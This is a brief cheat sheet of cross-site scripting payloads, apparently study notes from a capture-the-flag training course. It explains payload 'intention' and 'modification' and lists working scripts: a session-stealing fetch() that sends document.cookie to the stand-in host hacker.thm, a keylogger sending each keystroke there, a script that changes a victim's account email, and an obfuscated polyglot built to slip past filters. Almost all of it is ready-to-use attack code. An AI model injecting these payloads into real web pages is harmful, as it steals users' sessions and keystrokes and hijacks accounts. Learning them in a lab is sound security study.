# XSS

> Shahrukh Tramboo | January 26th, 2022

--------------------------------------

**XSS Payloads**

There are two parts to the payload,
the intention and the modification

The intention is what you wish the JavaScript to actually do 

The modification is the changes to the code we need to make it execute as every scenario is different

**Intentions Examples**

Proof Of Concept:
```bash
<script>alert('XSS');</script>
```

Session Stealing:
```bash
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

Key Logger:
```bash
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

Business Logic:
```bash
<script>user.changeEmail('attacker@hacker.thm');</script>
```


**XSS Polyglots**
```bash
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

